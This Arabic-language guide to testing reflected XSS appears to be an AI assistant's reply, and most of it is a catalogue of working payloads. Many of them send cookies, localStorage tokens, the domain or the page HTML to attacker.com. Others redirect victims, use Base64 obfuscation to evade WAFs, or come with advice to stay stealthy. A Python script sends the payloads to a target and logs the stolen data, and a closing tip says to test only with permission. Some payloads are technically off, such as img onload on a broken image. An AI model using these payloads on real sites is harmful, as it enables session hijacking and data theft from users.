
## الخطوات العملية لاختبار ثغرة XSS المنعكس
1. **إعداد البيئة**:
   - استخدم متصفحًا مع أداة وكيل (مثل **Burp Suite** أو **OWASP ZAP**) لمراقبة طلبات واستجابات HTTP.
   - أعد خادمًا خارجيًا (مثل خادم Python بسيط أو خدمة مثل `ngrok`) لتسجيل البيانات المرسلة من الحقن.
   - افتح أدوات المطورين في المتصفح (F12) لمراقبة وحدة التحكم (Console)، الشبكة (Network)، وتغييرات DOM.
   - تأكد من أن لديك روابط أو نماذج لاختبارها (مثل روابط تحتوي على معلمات URL أو نماذج إدخال).

2. **تحديد نقاط الإدخال العرضة**:
   - ابحث عن نقاط إدخال تُرسل بيانات إلى الخادم وتُعرض في الاستجابة، مثل:
     - معلمات URL (مثل `https://example.com/?q=test` أو `?id=123`).
     - حقول النماذج (مثل حقول البحث، التعليقات، أو الرسائل).
     - رؤوس HTTP (مثل `User-Agent` أو `Referer`) إذا عُرضت في الصفحة.
   - افحص استجابات الموقع (عبر Burp Suite أو عرض المصدر) لتحديد أين تُعرض الإدخالات (مثل داخل `<div>`، `<input>`، أو JavaScript).
   - تحقق من سياق العرض (مثل داخل HTML، سمة، أو JavaScript) لتصميم الحقنة المناسبة.

3. **إدخال الحقن**:
   - أدخل شيفرة JavaScript أو HTML ضارة في نقطة الإدخال العرضة.
   - صمم الحقنة لتنفيذ شيفرة ضارة، مثل:
     - `<script>alert('XSS')</script>`
     - `<img src=x onload="fetch('http://attacker.com/log?c='+document.cookie)">`
     - `javascript:alert('XSS')`
   - جرب الحقن في سياقات مختلفة:
     - معلمة URL: `https://example.com/search?q=<script>alert('XSS')</script>`
     - حقل نموذج: أدخل `<img src=x onload="fetch('http://attacker.com/log?c='+document.cookie)">` في حقل البحث.
     - رأس HTTP: استخدم Burp Suite لتعديل `User-Agent` إلى `<script>alert('XSS')</script>` إذا عُرض.

4. **مراقبة الاستجابات**:
   - تحقق من تنفيذ الحقنة عبر:
     - **أدوات المطورين**: راقب وحدة التحكم (Console) للأخطاء أو التنبيهات، والشبكة (Network) للطلبات الصادرة.
     - **خادم خارجي**: تحقق من سجلات الخادم لتأكيد استلام البيانات (مثل ملفات تعريف الارتباط).
     - **تغييرات DOM**: تحقق من تعديل الصفحة أو إعادة التوجيه.
   - **نجاح (True)**: الشيفرة تُنفذ (مثل ظهور تنبيه، إرسال بيانات إلى الخادم، أو إعادة توجيه).
   - **فشل (False)**: لا يتم التنفيذ بسبب فلاتر، CSP، أو تنظيف الإدخال.
   - سجل النتائج لتحديد الحقن الناجحة.

5. **تجربة أنواع حقن مختلفة**:
   - إذا فشلت الحقنة، جرب أنواعًا أخرى:
     - استخدام وسوم مختلفة: `<script>`، `<img>`، `<iframe>`، `<a>`، أو `<div>`.
     - استهداف أحداث مختلفة: `onload`، `onerror`، `onclick`، أو `onmouseover`.
     - تجاوز الفلاتر: جرب صيغ بديلة مثل `<SCRIPT>` (حروف كبيرة)، تعتيم الشيفرة بـ Base64، أو استخدام أحرف خاصة.
   - اختبر نقاط إدخال متعددة (مثل معلمات URL أخرى، حقول نماذج مختلفة، أو رؤوس HTTP).
   - جرب حقنًا تستهدف سياقات مختلفة (مثل حقن داخل سمات، JavaScript، أو CSS).

6. **تأكيد السياق وتصعيد الاستغلال (اختياري)**:
   - استخدم حقن تكشف سياق التنفيذ (مثل `<img src=x onload="fetch('http://attacker.com/log?d='+document.domain)">`).
   - إذا نجحت الحقن، جرب هجمات متقدمة مثل:
     - سرقة بيانات حساسة (مثل `localStorage.getItem('token')`).
     - التلاعب بالصفحة (مثل إنشاء نموذج مزيف).
     - تنفيذ إجراءات المستخدم (مثل إرسال طلبات POST).
   - حافظ على التخفي بتجنب التنبيهات البصرية إذا كنت تستهدف سياقات حساسة.

---

## جميع المحاولات الممكنة لاختبار ثغرة XSS المنعكس
في اختبار ثغرة XSS المنعكس، المحاولات تركز على إدخال شيفرات JavaScript أو HTML في نقاط إدخال تُعرض مباشرة في استجابة الصفحة. سأقسم المحاولات إلى فئتين:
1. **الحقن اليدوية**: للاختبار اليدوي عبر نقاط الإدخال العرضة.
2. **الحقن للأتمتة**: للاستخدام مع سكربتات أو أدوات آلية.

### 1. الحقن اليدوية
تُستخدم هذه الحقن عند اختبار الثغرة يدويًا عبر إدخال شيفرة في معلمات URL، حقول النماذج، أو رؤوس HTTP. الهدف هو تنفيذ JavaScript في استجابة الصفحة.

#### أ. حقن باستخدام وسوم HTML
{ #XSS_Idea_for_script_tag   }
إدراج وسوم HTML تحتوي على JavaScript مباشرة.
- **الحقن**: `<script>alert('XSS')</script>`
  - **الإدخال**: `https://example.com/search?q=<script>alert('XSS')</script>`
  - **كيف يعمل**: ينفذ تنبيهًا إذا عُرضت الشيفرة في HTML.
  - **متى يُستخدم؟**: لتأكيد وجود ثغرة XSS.
- **الحقن**: `<script>fetch('http://attacker.com/log?c='+encodeURIComponent(document.cookie))</script>`
  - **الإدخال**: `https://example.com/search?q=<script>fetch('http://attacker.com/log?c='+encodeURIComponent(document.cookie))</script>`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط إلى خادم المهاجم.
  - **متى يُستخدم؟**: لسرقة بيانات الجلسة.
- **الحقن**: `<script>document.location='http://attacker.com'</script>`
  - **الإدخال**: `https://example.com/search?q=<script>document.location='http://attacker.com'</script>`
  - **كيف يعمل**: يعيد توجيه المستخدم إلى موقع ضار.
  - **متى يُستخدم؟**: لإعادة التوجيه الخبيث.
- **الحقن**: `<script>fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})</script>`
  - **الإدخال**: أدخل في حقل نموذج: `<script>fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})</script>`
  - **كيف يعمل**: يرسل محتوى الصفحة إلى الخادم.
  - **متى يُستخدم؟**: لاستخراج محتوى DOM.
- **الحقن**: `<script>new Image().src='http://attacker.com/log?s='+encodeURIComponent(localStorage.getItem('token'))</script>`
  - **الإدخال**: `https://example.com/search?q=<script>new Image().src='http://attacker.com/log?s='+encodeURIComponent(localStorage.getItem('token'))</script>`
  - **كيف يعمل**: يرسل رمز الجلسة من `localStorage`.
  - **متى يُستخدم؟**: لسرقة بيانات التخزين.

#### ب. حقن باستخدام وسوم صور أو أحداث
{  #XSS--ALL--Event--Payload /   #XSS_Idea_for_Img_tag}
استخدام وسوم HTML مع أحداث JavaScript لتنفيذ الشيفرة.
- **الحقن**: `<img src=x onload="alert('XSS')">`
  - **الإدخال**: `https://example.com/search?q=<img src=x onload="alert('XSS')">`
  - **كيف يعمل**: ينفذ تنبيهًا عند تحميل الصورة.
  - **متى يُستخدم؟**: لتأكيد الثغرة تلقائيًا.
- **الحقن**: `<img src=x onload="fetch('http://attacker.com/log?c='+document.cookie)">`
  - **الإدخال**: `https://example.com/search?q=<img src=x onload="fetch('http://attacker.com/log?c='+document.cookie)">`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط عند تحميل الصورة.
  - **متى يُستخدم؟**: لسرقة البيانات تلقائيًا.
- **الحقن**: `<img src=x onerror="fetch('http://attacker.com/log?d='+document.domain)">`
  - **الإدخال**: أدخل في حقل نموذج: `<img src=x onerror="fetch('http://attacker.com/log?d='+document.domain)">`
  - **كيف يعمل**: يرسل النطاق عند فشل تحميل الصورة.
  - **متى يُستخدم؟**: لتجاوز فلاتر `<script>`.
- **الحقن**: `<img src=x onmouseover="new Image().src='http://attacker.com/log?s='+localStorage.getItem('token')">`
  - **الإدخال**: `https://example.com/search?q=<img src=x onmouseover="new Image().src='http://attacker.com/log?s='+localStorage.getItem('token')">`
  - **كيف يعمل**: يرسل رمز الجلسة عند تمرير المؤشر.
  - **متى يُستخدم؟**: لتتبع التفاعل.
- **الحقن**: `<img src=x onload="fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})">`
  - **الإدخال**: أدخل في حقل نموذج: `<img src=x onload="fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})">`
  - **كيف يعمل**: يرسل محتوى الصفحة عند تحميل الصورة.
  - **متى يُستخدم؟**: لاستخراج محتوى DOM.

#### ج. حقن باستخدام روابط JavaScript
{  #ideas_for_url }
استخدام بروتوكول `javascript:` في روابط أو سمات.
- **الحقن**: `<a href="javascript:alert('XSS')">Click</a>`
  - **الإدخال**: `https://example.com/search?q=<a href="javascript:alert('XSS')">Click</a>`
  - **كيف يعمل**: ينفذ تنبيهًا عند النقر على الرابط.
  - **متى يُستخدم؟**: لتأكيد الثغرة عند التفاعل.
- **الحقن**: `<a href="javascript:fetch('http://attacker.com/log?c='+document.cookie)">Click</a>`
  - **الإدخال**: `https://example.com/search?q=<a href="javascript:fetch('http://attacker.com/log?c='+document.cookie)">Click</a>`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط عند النقر.
  - **متى يُستخدم؟**: لسرقة البيانات عند التفاعل.
- **الحقن**: `<a href="javascript:document.location='http://attacker.com'">Click</a>`
  - **الإدخال**: `https://example.com/search?q=<a href="javascript:document.location='http://attacker.com'">Click</a>`
  - **كيف يعمل**: يعيد توجيه المستخدم عند النقر.
  - **متى يُستخدم؟**: لإعادة التوجيه.
- **الحقن**: `<a href="javascript:new Image().src='http://attacker.com/log?d='+document.domain">Click</a>`
  - **الإدخال**: أدخل في حقل نموذج: `<a href="javascript:new Image().src='http://attacker.com/log?d='+document.domain">Click</a>`
  - **كيف يعمل**: يرسل النطاق عند النقر.
  - **متى يُستخدم؟**: لتأكيد سياق التنفيذ.
- **الحقن**: `<a href="javascript:fetch('http://attacker.com/log', {method: 'POST', body: localStorage.getItem('token')})">Click</a>`
  - **الإدخال**: `https://example.com/search?q=<a href="javascript:fetch('http://attacker.com/log', {method: 'POST', body: localStorage.getItem('token')})">Click</a>`
  - **كيف يعمل**: يرسل رمز الجلسة عند النقر.
  - **متى يُستخدم؟**: لسرقة بيانات التخزين.

#### د. حقن داخل سمات أو JavaScript
{ #ideas_for_url /  #Inline_HTML_Injection}
إدراج شيفرة في سياقات سمات HTML أو JavaScript.
- **الحقن**: `" onfocus="alert('XSS')`
  - **الإدخال**: `https://example.com/search?q=" onfocus="alert('XSS')`
  - **كيف يعمل**: ينفذ تنبيهًا إذا أُدرج في سمة مثل `<input value="...">`.
  - **متى يُستخدم؟**: لاستهداف السمات.
- **الحقن**: `" onload="fetch('http://attacker.com/log?c='+document.cookie)`
  - **الإدخال**: `https://example.com/search?q=" onload="fetch('http://attacker.com/log?c='+document.cookie)`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط إذا أُدرج في سمة حدث.
  - **متى يُستخدم؟**: لاستهداف أحداث السمات.
- **الحقن**: `";alert('XSS');//`
  - **الإدخال**: `https://example.com/search?q=";alert('XSS');//`
  - **كيف يعمل**: ينفذ تنبيهًا إذا أُدرج في سياق JavaScript مثل `<script>var x="...";`.
  - **متى يُستخدم؟**: لاستهداف JavaScript.
- **الحقن**: `";fetch('http://attacker.com/log?c='+document.cookie);//`
  - **الإدخال**: `https://example.com/search?q=";fetch('http://attacker.com/log?c='+document.cookie);//`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط في سياق JavaScript.
  - **متى يُستخدم؟**: لسرقة البيانات في JavaScript.
- **الحقن**: `" onmouseover="new Image().src='http://attacker.com/log?s='+localStorage.getItem('token')`
  - **الإدخال**: `https://example.com/search?q=" onmouseover="new Image().src='http://attacker.com/log?s='+localStorage.getItem('token')`
  - **كيف يعمل**: يرسل رمز الجلسة عند تمرير المؤشر.
  - **متى يُستخدم؟**: لاستهداف سمات التفاعل.

#### هـ. حقن مع التعتيم
{ #XSS_Obfuscation_payloads /  #XSS_ecoded_payload }
استخدام تقنيات التعتيم لتجنب الكشف.
- **الحقن**: `<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>`
  - **الإدخال**: `https://example.com/search?q=<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>`
  - **كيف يعمل**: يفك تشفير Base64 لتنفيذ تنبيه.
  - **متى يُستخدم؟**: لتجاوز فلاتر WAF.
- **الحقن**: `<img src=x onload="eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vbG9nP2M9Jytkb2N1bWVudC5jb29raWUp'))">`
  - **الإدخال**: `https://example.com/search?q=<img src=x onload="eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vbG9nP2M9Jytkb2N1bWVudC5jb29raWUp'))">`
  - **كيف يعمل**: يفك تشفير Base64 ويرسل ملفات تعريف الارتباط.
  - **متى يُستخدم؟**: لتجنب أنظمة الكشف.
- **الحقن**: `<script>alert(String.fromCharCode(88,83,83))</script>`
  - **الإدخال**: `https://example.com/search?q=<script>alert(String.fromCharCode(88,83,83))</script>`
  - **كيف يعمل**: ينشئ تنبيهًا باستخدام رموز ASCII.
  - **متى يُستخدم؟**: لتجاوز فلاتر تحظر النصوص المباشرة.
- **الحقن**: `<img src=x onload="setTimeout(() => fetch('http://attacker.com/log?c='+document.cookie), 1000)">`
  - **الإدخال**: `https://example.com/search?q=<img src=x onload="setTimeout(() => fetch('http://attacker.com/log?c='+document.cookie), 1000)">`
  - **كيف يعمل**: يؤخر إرسال البيانات لتجنب الكشف.
  - **متى يُستخدم؟**: لتجنب أنظمة المراقبة الفورية.
- **الحقن**: `<script>document['location']='http://attacker.com'</script>`
  - **الإدخال**: `https://example.com/search?q=<script>document['location']='http://attacker.com'</script>`
  - **كيف يعمل**: يستخدم صيغة غير قياسية لإعادة التوجيه.
  - **متى يُستخدم؟**: لتجنب فلاتر البحث عن الكلمات.

### 2. الحقن للأتمتة
تُستخدم هذه الحقن مع سكربتات (مثل Python مع مكتبة `requests` أو `selenium`) لأتمتة اختبار مجموعة من الحقن المستخدمة في XSS المنعكس وتحليل الاستجابات.

#### أ. إعداد قائمة الحقن
- **المحاولات**:
  - إنشاء قائمة بالحقن التي تستهدف سياقات HTML، سمات، وJavaScript.
  - مثال قائمة:
    ```
    <script>fetch('http://attacker.com/log?c='+encodeURIComponent(document.cookie))</script>
    <img src=x onload="fetch('http://attacker.com/log?c='+document.cookie)">
    <a href="javascript:fetch('http://attacker.com/log?c='+document.cookie)">Click</a>
    ";fetch('http://attacker.com/log?c='+document.cookie);//
    <script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
    ```
- **كيف يعمل**:
  - يتم إرسال الحقن عبر نقاط إدخال (مثل معلمات URL أو حقول نماذج).
  - يتم مراقبة الخادم الخارجي أو المتصفح لتأكيد التنفيذ.
- **متى يُستخدم؟**:
  - عند اختبار نقاط إدخال متعددة بسرعة.

#### ب. سكربت أتمتة بسيط
- **السكربت** (مثال بلغة Python مع خادم لتسجيل البيانات):
  ```python
  from http.server import BaseHTTPRequestHandler, HTTPServer
  import urllib.parse
  import requests

  class LogServer(BaseHTTPRequestHandler):
      def do_GET(self):
          self.send_response(200)
          self.end_headers()
          query = urllib.parse.urlparse(self.path).query
          print(f"بيانات مستلمة: {urllib.parse.parse_qs(query)}")

      def do_POST(self):
          self.send_response(200)
          self.end_headers()
          content_length = int(self.headers['Content-Length'])
          post_data = self.rfile.read(content_length).decode()
          print(f"بيانات POST مستلمة: {post_data}")

  payloads = [
      "<script>fetch('http://localhost:8000/log?c='+encodeURIComponent(document.cookie))</script>",
      "<img src=x onload=\"fetch('http://localhost:8000/log?c='+document.cookie)\">",
      "<a href=\"javascript:fetch('http://localhost:8000/log?c='+document.cookie)\">Click</a>",
      "\";fetch('http://localhost:8000/log?c='+document.cookie);//",
      "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>"
  ]

  target_url = "https://example.com/search?q="
  for payload in payloads:
      try:
          encoded_payload = urllib.parse.quote(payload)
          response = requests.get(target_url + encoded_payload)
          print(f"تم إرسال: {payload}")
      except:
          print(f"فشل إرسال: {payload}")
  server = HTTPServer(('localhost', 8000), LogServer)
  print("تشغيل الخادم على http://localhost:8000")
  server.serve_forever()
  ```
- **كيف يعمل**:
  - يُشغل خادمًا محليًا لتسجيل البيانات.
  - يُرسل الحقن إلى معلمة URL عبر طلب GET.
  - يسجل البيانات المستلمة في الخادم.
- **متى يُستخدم؟**:
  - عند الحاجة لاختبار آلي لمعلمات URL أو نقاط إدخال.

#### ج. تحليل الاستجابات
- **المحاولات**:
  - قارن الاستجابات بناءً على:
    - **طلبات الشبكة**: تحقق من الطلبات المرسلة إلى `http://attacker.com/log`.
    - **وحدة التحكم**: تحقق من ظهور تنبيهات أو أخطاء في Console.
    - **تغييرات DOM**: تحقق من إعادة التوجيه أو تعديل الصفحة.
  - مثال: إذا تلقى الخادم `c=sessionid=abc123`، فهذا يؤكد نجاح الحقن.
- **كيف يعمل**:
  - يتم تسجيل الاستجابات لتحديد الحقن الناجحة.
- **متى يُستخدم؟**:
  - لتحديد النقاط القابلة للاستغلال.

#### د. توسيع قائمة الحقن
- **المحاولات**:
  - أضف حقنًا إضافية (مثل `<iframe src="javascript:alert('XSS')">` أو `<div onclick="fetch('http://attacker.com/log?c='+document.cookie)">`).
  - جرب أحداث أخرى (مثل `onfocus`، `onblur`) أو وسوم أخرى (مثل `<input>`، `<object>`).
  - اختبر سياقات JavaScript معقدة (مثل `eval(...)` أو `setTimeout(...)`).
- **كيف يعمل**:
  - يتم إنشاء قائمة موسعة تشمل كل المتغيرات الممكنة.
  - مثال: إضافة `<input type=text onfocus="fetch('http://attacker.com/log?c='+document.cookie)">` إلى القائمة.
- **متى يُستخدم؟**:
  - عند الحاجة لتغطية شاملة للسياقات.

---



1. حقن باستخدام وسوم HTML:
- <script>alert('XSS')</script>: ينفذ تنبيهًا عند العرض.
- <script>fetch('http://attacker.com/log?c='+encodeURIComponent(document.cookie))</script>: يرسل ملفات تعريف الارتباط.
- <script>document.location='http://attacker.com'</script>: يعيد توجيه المستخدم.
- <script>fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})</script>: يرسل محتوى الصفحة.
- <script>new Image().src='http://attacker.com/log?s='+encodeURIComponent(localStorage.getItem('token'))</script>: يرسل رمز الجلسة.

2. حقن باستخدام وسوم صور أو أحداث:
- <img src=x onload="alert('XSS')">: ينفذ تنبيهًا عند تحميل الصورة.
- <img src=x onload="fetch('http://attacker.com/log?c='+document.cookie)">: يرسل ملفات تعريف الارتباط.
- <img src=x onerror="fetch('http://attacker.com/log?d='+document.domain)">: يرسل النطاق.
- <img src=x onmouseover="new Image().src='http://attacker.com/log?s='+localStorage.getItem('token')">: يرسل رمز الجلسة عند تمرير المؤشر.
- <img src=x onload="fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})">: يرسل محتوى الصفحة.

3. حقن باستخدام روابط JavaScript:
- <a href="javascript:alert('XSS')">Click</a>: ينفذ تنبيهًا عند النقر.
- <a href="javascript:fetch('http://attacker.com/log?c='+document.cookie)">Click</a>: يرسل ملفات تعريف الارتباط عند النقر.
- <a href="javascript:document.location='http://attacker.com'">Click</a>: يعيد توجيه المستخدم.
- <a href="javascript:new Image().src='http://attacker.com/log?d='+document.domain">Click</a>: يرسل النطاق.
- <a href="javascript:fetch('http://attacker.com/log', {method: 'POST', body: localStorage.getItem('token')})">Click</a>: يرسل رمز الجلسة.

4. حقن داخل سمات أو JavaScript:
- " onfocus="alert('XSS'): ينفذ تنبيهًا في سمة.
- " onload="fetch('http://attacker.com/log?c='+document.cookie): يرسل ملفات تعريف الارتباط في سمة.
- ";alert('XSS');//: ينفذ تنبيهًا في سياق JavaScript.
- ";fetch('http://attacker.com/log?c='+document.cookie);//: يرسل ملفات تعريف الارتباط في JavaScript.
- " onmouseover="new Image().src='http://attacker.com/log?s='+localStorage.getItem('token'): يرسل رمز الجلسة في سمة.

5. حقن مع التعتيم:
- <script>eval(atob('YWxlcnQoJ1hTUycp'))</script>: يفك تشفير Base64 لتنفيذ تنبيه.
- <img src=x onload="eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vbG9nP2M9Jytkb2N1bWVudC5jb29raWUp'))">: يفك تشفير Base64 ويرسل ملفات تعريف الارتباط.
- <script>alert(String.fromCharCode(88,83,83))</script>: يستخدم رموز ASCII.
- <img src=x onload="setTimeout(() => fetch('http://attacker.com/log?c='+document.cookie), 1000)">: يؤخر إرسال البيانات.
- <script>document['location']='http://attacker.com'</script>: يستخدم صيغة غير قياسية.



---

**نصائح إضافية**:
- **اختبار توافق المتصفح**: اختبر الحقن في متصفحات مختلفة (Chrome، Firefox، Safari، Edge) لأن السلوك قد يختلف.
- **إعداد الخادم**: استخدم خادمًا بسيطًا (مثل Python `http.server`) أو `ngrok` لتسجيل البيانات، وتأكد من دعم طلبات GET وPOST.
- **تجاوز الفلاتر**: جرب تغيير حالة الأحرف (مثل `<SCRIPT>`)، استخدام أحداث غير شائعة (مثل `onfocus`)، أو تعتيم الشيفرة بـ Base64 أو ASCII.
- **اختبار نقاط الإدخال**: ركز على معلمات URL، حقول النماذج، ورؤوس HTTP التي تُعرض في الاستجابة.
- **الأدوات**: استخدم **Burp Suite** لمراقبة الطلبات، **XSStrike** لتوليد الحقن، أو **Selenium** لمحاكاة التفاعل مع الحقن.
- **القيود**: تحقق من سياسات CSP (Content Security Policy) التي قد تحظر تنفيذ JavaScript أو الطلبات الخارجية.
- **السلامة**: اختبر فقط بإذن صريح (مثل برامج مكافآت الأخطاء) وتجنب إلحاق الضرر.

إذا كنت تريد شرح خطوة أخرى بنفس الأسلوب (مثل "Test for Stored XSS" أو "Bypassing XSS Filters")، أو التركيز على سياق معين (مثل Reflected XSS في معلمات URL محددة)، أخبرني وسأقدم ردًا مخصصًا!